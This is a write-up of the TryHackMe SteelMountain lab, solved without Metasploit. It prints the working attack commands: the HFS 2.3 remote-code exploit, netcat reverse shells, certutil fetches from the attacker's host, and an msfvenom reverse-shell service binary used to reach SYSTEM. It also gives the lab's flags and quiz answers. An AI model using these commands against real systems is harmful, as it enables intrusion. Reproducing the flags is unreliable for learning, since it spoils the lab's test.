---
title: TryHackMe - SteelMountain w/o Metasploit
date: 2023-09-25
author: Abhinav Kumar
image: {
  src: "/images/tryhackme-steelmountain.jpg",
  alt: "THM SteelMountain Writeup",
}
description: TryHackMe SteelMountain is a Windows box where we exploit Unquoted Service Paths, replace the service to get System user.
draft: false
category: TryHackMe
---

# SteelMountain

TryHackMe Link to SteelMountain Machine - [THM-SteelMountain](https://tryhackme.com/room/steelmountain)


We will Solve the Machine Completely and post that Answer to the Questions on TryHackMe in the end.


Adding machine to hosts file.
```bash
abhinav@ETHICALHACKX:~$ echo "10.10.23.6    steelmountain.thm" | sudo tee -a /etc/hosts                                                            
[sudo] password for abhinav: 
10.10.23.6    steelmountain.thm
```


## Nmapping 

```bash
abhinav@ETHICALHACKX:~$ ports=$(nmap -p- --min-rate=1000 -T5 steelmountain.thm | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
                                                                                                                                                                           
abhinav@ETHICALHACKX:~$ echo $ports
80,135,139,445,3389,5985,8080,47001,49152,49153,49154,49155,49156,49163,49164
                                                                                                                                                                           
abhinav@ETHICALHACKX:~$ sudo nmap -sC -sV -A -O -T5 -p$ports steelmountain.thm
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-25 22:45 IST
Nmap scan report for steelmountain.thm (10.10.23.6)
Host is up (0.17s latency).

PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2023-09-25T17:17:11+00:00
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2023-09-24T17:12:27
|_Not valid after:  2024-03-25T17:12:27
|_ssl-date: 2023-09-25T17:17:16+00:00; 0s from scanner time.
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
49164/tcp open  msrpc              Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (96%), Microsoft Windows Server 2012 R2 (96%), Microsoft Windows Server 2012 R2 Update 1 (96%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (96%), Microsoft Windows Vista SP1 (96%), Microsoft Windows Server 2012 or Server 2012 R2 (95%), Microsoft Windows 7 or Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 SP2 Datacenter Version (94%), Microsoft Windows Server 2008 R2 SP1 (93%), Microsoft Windows Server 2008 SP1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:37:1c:d4:c3:b5 (unknown)
| smb2-time: 
|   date: 2023-09-25T17:17:11
|_  start_date: 2023-09-25T17:12:18
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   170.56 ms 10.14.0.1
2   170.77 ms steelmountain.thm (10.10.23.6)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.00 seconds
                              
```

As we see port 80 with http service , running IIS Server, we check the same in browser.
![THM SteelMountain HTTP WebPage](/images/thm-steelmountain-http.png)

Checking the page Source Code we get the below.
```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Steel Mountain</title>
<style>
* {font-family: Arial;}
</style>
</head>
<body><center>
<a href="index.html"><img src="/img/logo.png" style="width:500px;height:300px;"/></a>
<h3>Employee of the month</h3>
<img src="/img/BillHarper.png" style="width:200px;height:200px;"/>
</center>
</body>
</html>
```

Searching for the Service name and versions we can get the vulnerable service - on Port 8080, HttpFileServer httpd 2.3 .
Let us check the page in browser .

![THM SteelMountain - FileServer](/images/thm-steelmountain-fileserver.png)

Nmap as well as browsing the port 8080 gives us the service version information for the HttpFileServer - 2.3 .
Searching the same on google Immediately gives Remote Code Execution exploit available for the Rojetto FileServer - [CVE:2014-6287 - ExploitDB Link](https://www.exploit-db.com/exploits/39161).

We will try exploiting it manually without metasploit, and later use metasploit if at all it is required to answer any task on TryHackMe.

Let us download the exploit from the above link 
The exploit has note on executing it which says to execute the exloit while also having a netcat listner running , and the same directory to have the exploit PoC present as well.

## Initial Access

As the exploit has to be executed twice, and netcat listner to get reverse_shell, I am mentioning it step by step.

Step 1- Download the Exploit from [CVE:2014-6287 - ExploitDB Link](https://www.exploit-db.com/exploits/39161).
Modify the exploit lines to your tun0 (vpn) IP and any port. and place it in folder where you would also spin python http.server.
```
ip_addr = "10.xx.xx.xx" #local IP address #(ifconfig tun0 to get the IP)
local_port = "4444" # Local Port number
```

Step 2 - Download a stable nc.exe file from the link - [Netcat Stable](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe). After Downloading RENAME file as nc.exe and move the file to same folder as exploit file in step 1.


Step 3 - Spawn a python webserver on port 80. (any other port , you wil have to tweak the exploit script)
Hence keep all files in single folder and initiate python server.
```bash
abhinav@ETHICALHACKX:~/ctf/thm$ ls
39161.py  nc.exe  thm.ovpn  #nc.exe is must to have here
                                                                                           
abhinav@ETHICALHACKX:~/ctf/thm$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

#below output is after executing Step 5
10.10.23.6 - - [25/Sep/2023 23:50:18] "GET /nc.exe HTTP/1.1" 200 -
10.10.23.6 - - [25/Sep/2023 23:50:18] "GET /nc.exe HTTP/1.1" 200 -
10.10.23.6 - - [25/Sep/2023 23:50:18] "GET /nc.exe HTTP/1.1" 200 -
10.10.23.6 - - [25/Sep/2023 23:50:18] "GET /nc.exe HTTP/1.1" 200 -


```

Step 4 - Initiate a netcat listner on same port(4444) as mentioned in Step 1. 

```bash
abhinav@ETHICALHACKX:~/ctf/thm$ nc -nlvp 4444
listening on [any] 4444 ...

```
Step 5 - Execute the Exploit with python2 by giving the parameters Target_hostname and Port that is 8080.

```bash
abhinav@ETHICALHACKX:~/ctf/thm$ python2.7 39161.py steelmountain.thm 8080
                                                                                           
abhinav@ETHICALHACKX:~/ctf/thm$ 
```

Here is the screenshot of terminal at Step 5, that is executing the exploit once.

![THM SteelMountain Exploit Run -1](/images/thm-steelmountain-exploit-run-1.png)

Step 6 - Run the Exploit again, repeat Step 5, now here we will get a reverse_shell in the netcat listner we setup in step 4.

```bash
abhinav@ETHICALHACKX:~/ctf/thm$ python2.7 39161.py steelmountain.thm 8080

#on The netcat Listner we have
abhinav@ETHICALHACKX:~/ctf/thm$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.14.57.81] from (UNKNOWN) [10.10.23.6] 49335
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>

```
![TryhackMe SteelMountain Initial Access](/images/tryhackme-steelmountain-exploit-2.png)

We see the username is Bill,
lets get the user flag.

## User Flag

```bash
abhinav@ETHICALHACKX:~/ctf/thm$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.14.57.81] from (UNKNOWN) [10.10.23.6] 49351
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>whoami
whoami
steelmountain\bill

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd %userprofile%/desktop
cd %userprofile%/desktop

C:\Users\bill\Desktop>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\bill\Desktop

09/27/2019  09:08 AM    <DIR>          .
09/27/2019  09:08 AM    <DIR>          ..
09/27/2019  05:42 AM                70 user.txt
               1 File(s)             70 bytes
               2 Dir(s)  44,169,609,216 bytes free

C:\Users\bill\Desktop>type user.txt
type user.txt
b04763b6fcf51fcd7c13abc7db4fd365

C:\Users\bill\Desktop>

```

Let us get the WinPeas to the machine and find more information in order to find more about the machine.
I am using certutil to download WinPeas.ps1 from my machine.

```bash
C:\Users\bill\Desktop>

C:\Users\bill\Desktop>certutil.exe -urlcache -split -f http://10.14.57.81:80/winPEAS.ps1
certutil.exe -urlcache -split -f http://10.14.57.81:80/winPEAS.ps1
****  Online  ****
  000000  ...
  011824
CertUtil: -URLCache command completed successfully.

C:\Users\bill\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\bill\Desktop

09/25/2023  11:38 AM    <DIR>          .
09/25/2023  11:38 AM    <DIR>          ..
09/27/2019  05:42 AM                70 user.txt
09/25/2023  11:38 AM            71,716 winPEAS.ps1
               2 File(s)         71,786 bytes
               2 Dir(s)  44,169,576,448 bytes free

C:\Users\bill\Desktop>

#Python HTTP Server  Response
abhinav@ETHICALHACKX:~/ctf/thm$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.23.6 - - [26/Sep/2023 00:08:26] "GET /winPEAS.ps1 HTTP/1.1" 200 -           
10.10.23.6 - - [26/Sep/2023 00:08:26] "GET /winPEAS.ps1 HTTP/1.1" 200 -  
```

Let us run WinPeas.ps1 

I am only posting the portion of WinPeas Output thats of our interest.
SERVICE path vulnerable check  - says ASCService.exe is writable.
Which means we can write here a malicious binary and execute it as a service.

```bash
=========|| SERVICE path vulnerable check
Checking for vulnerable service .exe
LiveUpdateSvc found with permissions issue:
Identity STEELMOUNTAIN\bill has 'Write' perms for C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
AdvancedSystemCareService9 found with permissions issue:
Identity STEELMOUNTAIN\bill has 'Write' perms for C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
IObitUnSvr found with permissions issue:
Identity STEELMOUNTAIN\bill has 'Write' perms for C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe

=========|| Checking for Unquoted Service Paths
Fetching the list of services, this may take a while...
Unquoted Service Path found!
Name: AdvancedSystemCareService9
PathName: C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
StartName: LocalSystem
StartMode: Auto
Running: Running
Unquoted Service Path found!

```

We now create a payload using msfvenom to be uploaded to the path.

Step 6 - Create msfvenom payload && start python server (to upload payload to target)

```bash
abhinav@ETHICALHACKX:~/ctf/thm$ msfvenom -p windows/shell_reverse_tcp LHOST=10.14.57.81 LPORT=7777 -e x86/shikata_ga_nai -f exe -o ASCService.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: ASCService.exe
                                                                                   
abhinav@ETHICALHACKX:~/ctf/thm$ ls
39161.py  ASCService.exe  nc.exe  thm.ovpn  winPEAS.ps1
                                                                                   
abhinav@ETHICALHACKX:~/ctf/thm$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


```

Step 7 - Create another netcat listner on port (7777) specified in payload in last step

```bash
abhinav@ETHICALHACKX:~/ctf/thm$ nc -nlvp 7777
listening on [any] 7777 ...
```

Step 8 - Stop the Service  - AdvancedSystemCareService9

```bash
C:\Users\bill\Desktop>sc query
sc query AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9
DISPLAY_NAME: Advanced SystemCare Service 9
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\bill\Desktop>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0


C:\Users\bill\Desktop>sc query AdvancedSystemCareService9
sc query AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0


```

Step 9 - Replace the ASCService.exe with our payload, I am again using certutil to write on the same file.

Note: Check path of the service and replace it correctly, I am already in same path hence certutil will overwrite, else overwrite manually .

```bash
C:\Program Files (x86)\IObit\Advanced SystemCare>certutil.exe -urlcache -split -f http://10.14.57.981:80/ASCService.exe
certutil.exe -urlcache -split -f http://10.14.57.81:80/ASCService.exe
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.

```

Step 10 - Now the File is replaced in the same path, start the service and get reverse_shell in netcat we made in step 7.

```bash
C:\Program Files (x86)\IObit\Advanced SystemCare>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

#Netcat Listner
abhinav@ETHICALHACKX:~/ctf/thm$ nc -nlvp 7777                            
listening on [any] 7777 ...
connect to [10.14.57.81] from (UNKNOWN) [10.10.23.6] 49396
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```

We can see we are already  System User in the shell.

![TryHackMe - SteelMountain System User](/images/tryhackme-steelmountain-system-user.png)

## Root Flag.

Now that we are system user, lets get the flag.

```bash
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd C:/users/administrator/desktop
cd C:/users/administrator/desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\Administrator\Desktop

10/12/2020  12:05 PM    <DIR>          .
10/12/2020  12:05 PM    <DIR>          ..
10/12/2020  12:05 PM             1,528 activation.ps1
09/27/2019  05:41 AM                32 root.txt
               2 File(s)          1,560 bytes
               2 Dir(s)  44,169,175,040 bytes free


C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db80
C:\Users\Administrator\Desktop>

```

## Answering TryHackMe Questions

### Task 1 -Introduction

Who is the employee of the month?
Ans- Bill Harper (From the Source Code of Page on port 80)
### Task 2 - Initial Access
Q 2.1-  Scan the machine with nmap. What is the other port running a web server on?
Ans - 8080 (from Nmap scan or Browsing the port)

Q 2.2- Take a look at the other web server. What file server is running?
Ans - Rejetto HTTP File Server (Google Search)

Q 2.3- What is the CVE number to exploit this file server?
Ans - 2014-6287 (ExploitDB Link)

Q 2.4- Use Metasploit to get an initial shell. What is the user flag?
Ans - b04763b6fcf51fcd7c13abc7db4fd365  (We have not used Metasploit)

### Task 3 - Privilege Escalation

Q 3.1- Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
Ans - AdvancedSystemCareService9 (WinPeas Output above)

Q 3.2- What is the root flag?
Ans - 9af5f314f57607c00fd09803a587db80

### Task4 - Access and Escalation Without Metasploit

Q 4.1- What powershell -c command could we run to manually find out the service name?
Ans - powershell -c "Get-Service"  (Google Search)


## Learnings

1. Using msfvenom to generate payloads.
2. Unquoted Service Paths and Writable path for service can be used to run payload on machine.
